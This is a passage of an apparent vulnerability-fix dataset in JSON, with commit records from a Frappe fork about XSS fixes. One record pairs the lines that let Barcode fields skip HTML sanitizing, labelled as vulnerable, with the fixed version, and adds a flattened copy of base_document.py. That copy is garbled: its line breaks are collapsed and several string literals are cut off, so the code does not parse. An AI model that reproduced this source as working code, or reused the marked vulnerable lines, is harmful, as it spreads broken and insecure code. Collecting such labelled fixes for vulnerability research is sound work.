limit_page_length,\n\t\t\t\t\"condition\": (\" and \" + \" and \".join(conditions)) if conditions else \"\"\n\t\t}\n\n\tposts = frappe.db.sql(query, as_dict=1)\n\n\tfor post in posts:\n\t\tpost.cover_image = find_first_image(post.content)\n\t\tpost.published = global_date_format(post.creation)\n\t\tpost.content = strip_html_tags(post.content[:340])\n\t\tif not post.comments:\n\t\t\tpost.comment_text = _('No comments yet')\n\t\telif post.comments==1:\n\t\t\tpost.comment_text = _('1 comment')\n\t\telse:\n\t\t\tpost.comment_text = _('{0} comments').format(str(post.comments))\n\n\t\tpost.avatar = post.avatar or \"\"\n\t\tpost.category = frappe.db.get_value('Blog Category', post.blog_category,\n\t\t\t['route', 'title'], as_dict=True)\n\n\t\tif post.avatar and (not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"):\n\t\t\tpost.avatar = \"/\" + post.avatar\n\n\treturn posts\n"}}, "msg": "fix(blog): Fix possible reflected XSS attack vector"}, "acd2f589b6cd2d1011be4a4e4965a1b3ed489c37": {"url": "https://api.github.com/repos/kitechx/frappe/commits/acd2f589b6cd2d1011be4a4e4965a1b3ed489c37", "html_url": "https://github.com/kitechx/frappe/commit/acd2f589b6cd2d1011be4a4e4965a1b3ed489c37", "sha": "acd2f589b6cd2d1011be4a4e4965a1b3ed489c37", "keyword": "XSS fix", "diff": "diff --git a/frappe/core/doctype/doctype/doctype.py b/frappe/core/doctype/doctype/doctype.py\nindex a06a33df1..fedb605ad 100644\n--- a/frappe/core/doctype/doctype/doctype.py\n+++ b/frappe/core/doctype/doctype/doctype.py\n@@ -715,7 +715,6 @@ def scrub_fetch_from(field):\n \tfor d in fields:\n \t\tif not d.permlevel: d.permlevel = 0\n \t\tif d.fieldtype != \"Table\": d.allow_bulk_edit = 0\n-\t\tif d.fieldtype == \"Barcode\": d.ignore_xss_filter = 1\n \t\tif not d.fieldname:\n \t\t\td.fieldname = d.fieldname.lower()\n \ndiff --git a/frappe/model/base_document.py b/frappe/model/base_document.py\nindex 922557fee..982c54c3a 100644\n--- a/frappe/model/base_document.py\n+++ b/frappe/model/base_document.py\n@@ -627,7 +627,7 @@ def _sanitize_content(self):\n \n \t\t\telif df and (df.get(\"ignore_xss_filter\")\n \t\t\t\t\t\tor (df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\")\n-\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")\n+\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\", \"Barcode\")\n \n \t\t\t\t\t\t# cancelled and submit but not update after submit should be ignored\n \t\t\t\t\t\tor self.docstatus==2\n", "message": "", "files": {"/frappe/core/doctype/doctype/doctype.py": {"changes": [{"diff": "\n \tfor d in fields:\n \t\tif not d.permlevel: d.permlevel = 0\n \t\tif d.fieldtype != \"Table\": d.allow_bulk_edit = 0\n-\t\tif d.fieldtype == \"Barcode\": d.ignore_xss_filter = 1\n \t\tif not d.fieldname:\n \t\t\td.fieldname = d.fieldname.lower()\n ", "add": 0, "remove": 1, "filename": "/frappe/core/doctype/doctype/doctype.py", "badparts": ["\t\tif d.fieldtype == \"Barcode\": d.ignore_xss_filter = 1"], "goodparts": []}]}, "/frappe/model/base_document.py": {"changes": [{"diff": "\n \n \t\t\telif df and (df.get(\"ignore_xss_filter\")\n \t\t\t\t\t\tor (df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\")\n-\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")\n+\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\", \"Barcode\")\n \n \t\t\t\t\t\t# cancelled and submit but not update after submit should be ignored\n \t\t\t\t\t\tor self.docstatus==2\n", "add": 1, "remove": 1, "filename": "/frappe/model/base_document.py", "badparts": ["\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")"], "goodparts": ["\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\", \"Barcode\")"]}], "source": "\n from __future__ import unicode_literals from six import iteritems, string_types import datetime import frappe, sys from frappe import _ from frappe.utils import(cint, flt, now, cstr, strip_html, \tsanitize_html, sanitize_email, cast_fieldtype) from frappe.model import default_fields from frappe.model.naming import set_new_name from frappe.model.utils.link_count import notify_link_count from frappe.modules import load_doctype_module from frappe.model import display_fieldtypes from frappe.model.db_schema import type_map, varchar_len from frappe.utils.password import get_decrypted_password, set_encrypted_password _classes={} def get_controller(doctype): \t\"\"\"Returns the **class** object of the given DocType. \tFor `custom` type, returns `frappe.model.document.Document`. \t:param doctype: DocType name as string.\"\"\" \tfrom frappe.model.document import Document \tglobal _classes \tif not doctype in _classes: \t\tmodule_name, custom=frappe.db.get_value(\"DocType\", doctype,(\"module\", \"custom\"), cache=True) \\ \t\t\tor[\"Core\", False] \t\tif custom: \t\t\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name) \t\t\tclassname=doctype.replace(\" \", \"\").replace(\"-\", \"\") \t\t\tif hasattr(module, classname): \t\t\t\t_class=getattr(module, classname) \t\t\t\tif issubclass(_class, BaseDocument): \t\t\t\t\t_class=getattr(module, classname) \t\t\t\telse: \t\t\t\t\traise ImportError(doctype) \t\t\telse: \t\t\t\traise ImportError(doctype) \t\t_classes[doctype]=_class \treturn _classes[doctype] class BaseDocument(object): \tignore_in_getter=(\"doctype\", \"_meta\", \"meta\", \"_table_fields\", \"_valid_columns\") \tdef __init__(self, d): \t\tself.update(d) \t\tself.dont_update_if_missing=[] \t\tif hasattr(self, \"__setup__\"): \t\t\tself.__setup__() \t@property \tdef meta(self): \t\tif not hasattr(self, \"_meta\"): \t\t\tself._meta=frappe.get_meta(self.doctype) \t\treturn self._meta \tdef update(self, d): \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in d: \t\t\t\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d): \t\tif isinstance(d, BaseDocument): \t\t\td=d.get_valid_dict() \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\tfor key, value in iteritems(d): \t\t\t \t\t\tif(self.get(key) is None) and(value is not None) and(key not in self.dont_update_if_missing): \t\t\t\tself.set(key, value) \tdef get_db_value(self, key): \t\treturn frappe.db.get_value(self.doctype, self.name, key) \tdef get(self, key=None, filters=None, limit=None, default=None): \t\tif key: \t\t\tif isinstance(key, dict): \t\t\t\treturn _filter(self.get_all_children(), key, limit=limit) \t\t\tif filters: \t\t\t\tif isinstance(filters, dict): \t\t\t\t\tvalue=_filter(self.__dict__.get(key,[]), filters, limit=limit) \t\t\t\telse: \t\t\t\t\tdefault=filters \t\t\t\t\tfilters=None \t\t\t\t\tvalue=self.__dict__.get(key, default) \t\t\telse: \t\t\t\tvalue=self.__dict__.get(key, default) \t\t\tif value is None and key not in self.ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for d in self.meta.get_table_fields()): \t\t\t\tself.set(key,[]) \t\t\t\tvalue=self.__dict__.get(key) \t\t\treturn value \t\telse: \t\t\treturn self.__dict__ \tdef getone(self, key, filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key, value) \t\telse: \t\t\tself.__dict__[key]=value \tdef delete_key(self, key): \t\tif key in self.__dict__: \t\t\tdel self.__dict__[key] \tdef append(self, key, value=None): \t\tif value==None: \t\t\tvalue={} \t\tif isinstance(value,(dict, BaseDocument)): \t\t\tif not self.__dict__.get(key): \t\t\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append(value) \t\t\t \t\t\tvalue.parent_doc=self \t\t\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif(getattr(self, '_metaclass', None) \t\t\t\tor self.__class__.__name__ in('Meta', 'FormMeta', 'DocField')): \t\t\t\treturn value \t\t\traise ValueError( \t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not{2}({3})'.format(key, \t\t\t\t\tself.name, str(type(value))[1:-1], value) \t\t\t) \tdef extend(self, key, value): \t\tif isinstance(value, list): \t\t\tfor v in value: \t\t\t\tself.append(key, v) \t\telse: \t\t\traise ValueError \tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t\tif not isinstance(value, BaseDocument): \t\t\tif \"doctype\" not in value: \t\t\t\tvalue[\"doctype\"]=self.get_table_field_doctype(key) \t\t\t\tif not value[\"doctype\"]: \t\t\t\t\traise AttributeError(key) \t\t\tvalue=get_controller(value[\"doctype\"])(value) \t\t\tvalue.init_valid_columns() \t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus=0 \t\tif not getattr(value, \"idx\", None): \t\t\tvalue.idx=len(self.get(key) or[]) +1 \t\tif not getattr(value, \"name\", None): \t\t\tvalue.__dict__['__islocal']=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not sanitize and d[fieldname] is None: \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif df: \t\t\t\tif df.fieldtype==\"Check\": \t\t\t\t\tif d[fieldname]==None: \t\t\t\t\t\td[fieldname]=0 \t\t\t\t\telif(not isinstance(d[fieldname], int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else 0 \t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\": \t\t\t\t\td[fieldname]=None \t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\": \t\t\t\t\t \t\t\t\t\td[fieldname]=None \t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d[fieldname],(datetime.datetime, datetime.time, datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]) \t\treturn d \tdef init_valid_columns(self): \t\tfor key in default_fields: \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \t\t\tif key in(\"idx\", \"docstatus\") and self.__dict__[key] is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns(): \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \tdef get_valid_columns(self): \t\tif self.doctype not in frappe.local.valid_columns: \t\t\tif self.doctype in(\"DocField\", \"DocPerm\") and self.parent in(\"DocType\", \"DocField\", \"DocPerm\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns() \t\t\tfrappe.local.valid_columns[self.doctype]=valid \t\treturn frappe.local.valid_columns[self.doctype] \tdef is_new(self): \t\treturn self.get(\"__islocal\") \tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False): \t\tdoc=self.get_valid_dict(convert_dates_to_str=convert_dates_to_str) \t\tdoc[\"doctype\"]=self.doctype \t\tfor df in self.meta.get_table_fields(): \t\t\tchildren=self.get(df.fieldname) or[] \t\t\tdoc[df.fieldname]=[d.as_dict(no_nulls=no_nulls) for d in children] \t\tif no_nulls: \t\t\tfor k in list(doc): \t\t\t\tif doc[k] is None: \t\t\t\t\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self.get(key): \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self): \t\treturn frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname): \t\treturn self.meta.get_field(fieldname).options \tdef get_parentfield_of_doctype(self, doctype): \t\tfieldname=[df.fieldname for df in self.meta.get_table_fields() if df.options==doctype] \t\treturn fieldname[0] if fieldname else None \tdef db_insert(self): \t\t\"\"\"INSERT the document(with valid columns) in the database.\"\"\" \t\tif not self.name: \t\t\t \t\t\tset_new_name(self) \t\tif not self.creation: \t\t\tself.creation=self.modified=now() \t\t\tself.created_by=self.modifield_by=frappe.session.user \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}` \t\t\t\t({columns}) values({values})\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tcolumns=\", \".join([\"`\"+c+\"`\" for c in columns]), \t\t\t\t\tvalues=\", \".join([\"%s\"] * len(columns)) \t\t\t\t), list(d.values())) \t\texcept Exception as e: \t\t\tif e.args[0]==1062: \t\t\t\tif \"PRIMARY\" in cstr(e.args[1]): \t\t\t\t\tif self.meta.autoname==\"hash\": \t\t\t\t\t\t \t\t\t\t\t\tself.name=None \t\t\t\t\t\tself.db_insert() \t\t\t\t\t\treturn \t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif \"Duplicate\" in cstr(e.args[1]): \t\t\t\t\t \t\t\t\t\tself.show_unique_validation_message(e) \t\t\t\telse: \t\t\t\t\traise \t\t\telse: \t\t\t\traise \t\tself.set(\"__islocal\", False) \tdef db_update(self): \t\tif self.get(\"__islocal\") or not self.name: \t\t\tself.db_insert() \t\t\treturn \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\t \t\tname=d['name'] \t\tdel d['name'] \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}` \t\t\t\tset{values} where name=%s\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tvalues=\", \".join([\"`\"+c+\"`=%s\" for c in columns]) \t\t\t\t), list(d.values()) +[name]) \t\texcept Exception as e: \t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: \t\t\t\traise \tdef show_unique_validation_message(self, e): \t\ttype, value, traceback=sys.exc_info() \t\tfieldname, label=str(e).split(\"'\")[-2], None \t\t \t\t \t\tif \"unique_\" in fieldname: \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname))) \t\t \t\traise frappe.UniqueValidationError(self.doctype, self.name, e) \tdef update_modified(self): \t\t'''Update modified timestamp''' \t\tself.set(\"modified\", now()) \t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False) \tdef _fix_numeric_types(self): \t\tfor df in self.meta.get(\"fields\"): \t\t\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\telif self.get(df.fieldname) is not None: \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\t\telif df.fieldtype in(\"Float\", \"Currency\", \"Percent\"): \t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname))) \t\tif self.docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef _get_missing_mandatory_fields(self): \t\t\"\"\"Get mandatory fields that do not have any values\"\"\" \t\tdef get_msg(df): \t\t\tif df.fieldtype==\"Table\": \t\t\t\treturn \"{}:{}:{}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label)) \t\t\telif self.parentfield: \t\t\t\treturn \"{}:{}{} \t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label)) \t\t\telse: \t\t\t\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent), _(df.label)) \t\tmissing=[] \t\tfor df in self.meta.get(\"fields\",{\"reqd\":('=', 1)}): \t\t\tif self.get(df.fieldname) in(None,[]) or not strip_html(cstr(self.get(df.fieldname))).strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t\tfor fieldname in(\"parent\", \"parenttype\"): \t\t\t\tif not self.get(fieldname): \t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname)))) \t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns list of invalid links and also updates fetch values if not set''' \t\tdef get_msg(df, docname): \t\t\tif self.parentfield: \t\t\t\treturn \"{} \t\t\telse: \t\t\t\treturn \"{}:{}\".format(_(df.label), docname) \t\tinvalid_links=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{\"fieldtype\":('=', \"Dynamic Link\")})): \t\t\tdocname=self.get(df.fieldname) \t\t\tif docname: \t\t\t\tif df.fieldtype==\"Link\": \t\t\t\t\tdoctype=df.options \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field{0}\").format(df.fieldname)) \t\t\t\telse: \t\t\t\t\tdoctype=self.get(df.options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname) \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and not self.get(_df.fieldname)) \t\t\t\t] \t\t\t\tif not fields_to_fetch: \t\t\t\t\t \t\t\t\t\tvalues=frappe._dict(name=frappe.db.get_value(doctype, docname, \t\t\t\t\t\t'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname, values.name) \t\t\t\t\tfor _df in fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname) \t\t\t\t\tif not values.name: \t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname))) \t\t\t\t\telif(df.fieldname !=\"amended_from\" \t\t\t\t\t\tand(is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable \t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2): \t\t\t\t\t\tcancelled_links.append((df.fieldname, docname, get_msg(df, docname))) \t\treturn invalid_links, cancelled_links \tdef _validate_selects(self): \t\tif frappe.flags.in_import: \t\t\treturn \t\tfor df in self.meta.get_select_fields(): \t\t\tif df.fieldname==\"naming_series\" or not(self.get(df.fieldname) and df.options): \t\t\t\tcontinue \t\t\toptions=(df.options or \"\").split(\"\\n\") \t\t\t \t\t\tif not filter(None, options): \t\t\t\tcontinue \t\t\t \t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and value.startswith(\"_T-\")): \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta.get_label(df.fieldname)) \t\t\t\tcomma_options='\", \"'.join(_(each) for each in options) \t\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants: \t\t\treturn \t\tconstants=[d.fieldname for d in self.meta.get(\"fields\",{\"set_only_once\":('=',1)})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname) \t\t\t \t\t\tif df.fieldtype=='Date' or df.fieldtype=='Datetime': \t\t\t\tvalue=str(values.get(fieldname)) \t\t\telse: \t\t\t\tvalue =values.get(fieldname) \t\t\tif self.get(fieldname) !=value: \t\t\t\tfrappe.throw(_(\"Value cannot be changed for{0}\").format(self.meta.get_label(fieldname)), \t\t\t\t\tfrappe.CannotChangeConstantError) \tdef _validate_length(self): \t\tif frappe.flags.in_install: \t\t\treturn \t\tif self.meta.issingle: \t\t\t \t\t\treturn \t\tcolumn_types_to_check_length=('varchar', 'int', 'bigint') \t\tfor fieldname, value in iteritems(self.get_valid_dict()): \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif not df or df.fieldtype=='Check': \t\t\t\t \t\t\t\tcontinue \t\t\tcolumn_type=type_map[df.fieldtype][0] or None \t\t\tdefault_column_max_length=type_map[df.fieldtype][1] or None \t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length: \t\t\t\tmax_length=cint(df.get(\"length\")) or cint(default_column_max_length) \t\t\t\tif len(cstr(value)) > max_length: \t\t\t\t\tif self.parentfield and self.idx: \t\t\t\t\t\treference=_(\"{0}, Row{1}\").format(_(self.doctype), self.idx) \t\t\t\t\telse: \t\t\t\t\t\treference=\"{0}{1}\".format(_(self.doctype), self.name) \t\t\t\t\tfrappe.throw(_(\"{0}: '{1}'({3}) will get truncated, as max characters allowed is{2}\")\\ \t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big')) \tdef _validate_update_after_submit(self): \t\t \t\tdb_values=frappe.get_doc(self.doctype, self.name).as_dict() \t\tfor key in self.as_dict(): \t\t\tdf=self.meta.get_field(key) \t\t\tdb_value=db_values.get(key) \t\t\tif df and not df.allow_on_submit and(self.get(key) or db_value): \t\t\t\tif df.fieldtype==\"Table\": \t\t\t\t\t \t\t\t\t\t \t\t\t\t\tself_value=len(self.get(key)) \t\t\t\t\tdb_value=len(db_value) \t\t\t\telse: \t\t\t\t\tself_value=self.get_value(key) \t\t\t\tif self_value !=db_value: \t\t\t\t\tfrappe.throw(_(\"Not allowed to change{0} after submission\").format(df.label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content(self): \t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t-Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code' \t\t\"\"\" \t\tif frappe.flags.in_install: \t\t\treturn \t\tfor fieldname, value in self.get_valid_dict().items(): \t\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not in value and u\">\" not in value): \t\t\t\t \t\t\t\tcontinue \t\t\telif \"<!--markdown -->\" in value and not(\"<script\" in value or \"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tsanitized_value=value \t\t\tif df and df.get(\"fieldtype\") in(\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\": \t\t\t\tsanitized_value=sanitize_email(value) \t\t\telif df and(df.get(\"ignore_xss_filter\") \t\t\t\t\t\tor(df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\") \t\t\t\t\t\tor df.get(\"fieldtype\") in(\"Attach\", \"Attach Image\") \t\t\t\t\t\t \t\t\t\t\t\tor self.docstatus==2 \t\t\t\t\t\tor(self.docstatus==1 and not df.get(\"allow_on_submit\"))): \t\t\t\tcontinue \t\t\telse: \t\t\t\tsanitized_value=sanitize_html(value, linkify=df.fieldtype=='Text Editor') \t\t\tself.set(fieldname, sanitized_value) \tdef _save_passwords(self): \t\t'''Save password field values in __Auth table''' \t\tif self.flags.ignore_save_passwords is True: \t\t\treturn \t\tfor df in self.meta.get('fields',{'fieldtype':('=', 'Password')}): \t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue \t\t\tnew_password=self.get(df.fieldname) \t\t\tif new_password and not self.is_dummy_password(new_password): \t\t\t\t \t\t\t\tset_encrypted_password(self.doctype, self.name, new_password, df.fieldname) \t\t\t\t \t\t\t\tself.set(df.fieldname, '*'*len(new_password)) \tdef get_password(self, fieldname='password', raise_exception=True): \t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)): \t\t\treturn self.get(fieldname) \t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception) \tdef is_dummy_password(self, pwd): \t\treturn ''.join(set(pwd))=='*' \tdef precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float precision for a particular field(or get global default). \t\t:param fieldname: Fieldname for which precision is required. \t\t:param parentfield: If fieldname is in child table.\"\"\" \t\tfrom frappe.model.meta import get_field_precision \t\tif parentfield and not isinstance(parentfield, string_types): \t\t\tparentfield=parentfield.parentfield \t\tcache_key=parentfield or \"main\" \t\tif not hasattr(self, \"_precision\"): \t\t\tself._precision=frappe._dict() \t\tif cache_key not in self._precision: \t\t\tself._precision[cache_key]=frappe._dict() \t\tif fieldname not in self._precision[cache_key]: \t\t\tself._precision[cache_key][fieldname]=None \t\t\tdoctype=self.meta.get_field(parentfield).options if parentfield else self.doctype \t\t\tdf=frappe.get_meta(doctype).get_field(fieldname) \t\t\tif df.fieldtype in(\"Currency\", \"Float\", \"Percent\"): \t\t\t\tself._precision[cache_key][fieldname]=get_field_precision(df, self) \t\treturn self._precision[cache_key][fieldname] \tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False): \t\tfrom frappe.utils.formatters import format_value \t\tdf=self.meta.get_field(fieldname) \t\tif not df and fieldname in default_fields: \t\t\tfrom frappe.model.meta import get_default_df \t\t\tdf=get_default_df(fieldname) \t\tval=self.get(fieldname) \t\tif translated: \t\t\tval=_(val) \t\tif absolute_value and isinstance(val,(int, float)): \t\t\tval=abs(self.get(fieldname)) \t\tif not doc: \t\t\tdoc=getattr(self, \"parent_doc\", None) or self \t\treturn format_value(val, df=df, doc=doc, currency=currency) \tdef is_print_hide(self, fieldname, df=None, for_print=True): \t\t\"\"\"Returns true if fieldname is to be hidden for print. \t\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2\"] \t\t:param fieldname: Fieldname to be checked if hidden. \t\t\"\"\" \t\tmeta_df=self.meta.get_field(fieldname) \t\tif meta_df and meta_df.get(\"__print_hide\"): \t\t\treturn True \t\tprint_hide=0 \t\tif self.get(fieldname)==0 and not self.meta.istable: \t\t\tprint_hide=( df and df.print_hide_if_no_value) or( meta_df and meta_df.print_hide_if_no_value) \t\tif not print_hide: \t\t\tif df and df.print_hide is not None: \t\t\t\tprint_hide=df.print_hide \t\t\telif meta_df: \t\t\t\tprint_hide=meta_df.print_hide \t\treturn print_hide \tdef in_format_data(self, fieldname): \t\t\"\"\"Returns True if shown via Print Format::`format_data` property. \t\t\tCalled from within standard print format.\"\"\" \t\tdoc=getattr(self, \"parent_doc\", self) \t\tif hasattr(doc, \"format_data_map\"): \t\t\treturn fieldname in doc.format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields): \t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\" \t\tto_reset=[] \t\tfor df in high_permlevel_fields: \t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes: \t\t\t\tto_reset.append(df) \t\tif to_reset: \t\t\tif self.is_new(): \t\t\t\t \t\t\t\tref_doc=frappe.new_doc(self.doctype) \t\t\telse: \t\t\t\t \t\t\t\tif self.get('parent_doc'): \t\t\t\t\tself.parent_doc.get_latest() \t\t\t\t\tref_doc=[d for d in self.parent_doc.get(self.parentfield) if d.name==self.name][0] \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor df in to_reset: \t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)) \tdef get_value(self, fieldname): \t\tdf=self.meta.get_field(fieldname) \t\tval=self.get(fieldname) \t\treturn self.cast(val, df) \tdef cast(self, value, df): \t\treturn cast_fieldtype(df.fieldtype, value) \tdef _extract_images_from_text_editor(self): \t\tfrom frappe.utils.file_manager import extract_images_from_doc \t\tif self.doctype !=\"DocType\": \t\t\tfor df in self.meta.get(\"fields\",{\"fieldtype\":('=', \"Text Editor\")}): \t\t\t\textract_images_from_doc(self, df.fieldname) def _filter(data, filters, limit=None): \t\"\"\"pass filters as: \t\t{\"key\": \"val\", \"key\":[\"!=\", \"val\"], \t\t\"key\":[\"in\", \"val\"], \"key\":[\"not in\", \"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)}\"\"\" 